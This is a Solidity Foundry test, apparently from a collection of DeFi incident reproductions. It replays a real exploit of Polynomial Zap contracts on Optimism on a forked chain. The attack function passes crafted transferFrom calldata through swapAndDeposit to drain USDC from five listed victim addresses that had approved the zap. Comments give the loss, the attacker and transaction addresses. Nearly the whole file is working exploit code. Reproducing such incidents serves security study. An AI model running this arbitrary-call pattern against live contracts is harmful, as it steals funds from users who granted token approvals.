// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~1.4K USD
// TX : https://app.blocksec.com/explorer/tx/optimism/0x9f34ae044cbbf3f1603769dcd90163add48348dde7e1dda41817991935ebfa2f
// Attacker : https://optimistic.etherscan.io/address/0xcf8396010fb7e651f85a439dd7ebc0c8ab56b3f3
// Attack Contract : https://optimistic.etherscan.io/address/0xf682e302f16c9509ffa133029ccf6de55f4e29a8
// GUY : https://x.com/peckshield/status/1602216000187174912
interface PolynomialZap {
    function swapAndDeposit(
        address user,
        address token,
        address depositToken,
        address swapTarget,
        address vault,
        uint256 amount,
        bytes memory swapData
    ) external payable;
}

contract ContractTest is Test {
    // Constants
    IERC20 private constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
    IERC20 private constant WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 private constant USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    address private constant ETH_ADDRESS = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // State variables
    address private vuln = 0x00dD464dBA9fC0C20c4cC4D470E8Bf965788C150;
    PolynomialZap private zap = PolynomialZap(0xDEEB242E045e5827Edf526399bd13E7fFEba4281);
    PolynomialZap private zaps = PolynomialZap(0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82);
    address private pool = 0x1D751bc1A723AccF1942122ca9aa82d49D08d2AE;

    // Victim addresses
    address[] private victims = [
        0x6467024Ef6247A94c8cf60D50715aE71B8B1dfBf,
        0x59022C79236A0F90bAc80b29357bc1d3e6d227d5,
        0xDa1521c966bc95324E156f4F04B28F2804985da5,
        0xfd47c9Ad54D12Caa895FabCD4f7F4308a5F24161,
        0x316c42Af89b913429DBe4a86f30373172340A821
    ];

    function setUp() public {
        vm.createSelectFork("optimism", 39_343_642);
    }

    function testExploit() public {
        attack();
    }

    function attack() public {
        for (uint256 i = 0; i < victims.length; i++) {
            executeSwapAndDeposit(victims[i]);
        }
        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    function executeSwapAndDeposit(address victim) internal {
        bytes memory data = encodeTransferData(victim);
        PolynomialZap zapContract = (victim == victims[0]) ? zap : zaps;

        zapContract.swapAndDeposit(victim, ETH_ADDRESS, address(this), address(USDC), address(this), 0, data);
    }

    function encodeTransferData(address victim) internal view returns (bytes memory) {
        uint256 amount;
        if (victim == victims[0]) {
            amount = USDC.balanceOf(victim);
        } else if (victim == victims[1]) {
            amount = 10 * 1e6;
        } else {
            amount = USDC.allowance(victim, address(zaps));
        }
        return abi.encodeWithSelector(bytes4(0x23b872dd), victim, address(this), amount);
    }

    function balanceOf(address account) public view returns (uint256) {
        return 1;
    }

    function approve(address spender, uint256 amount) public pure returns (bool) {
        return true;
    }

    function initiateDeposit(address _add, uint256 amount) external {}
}
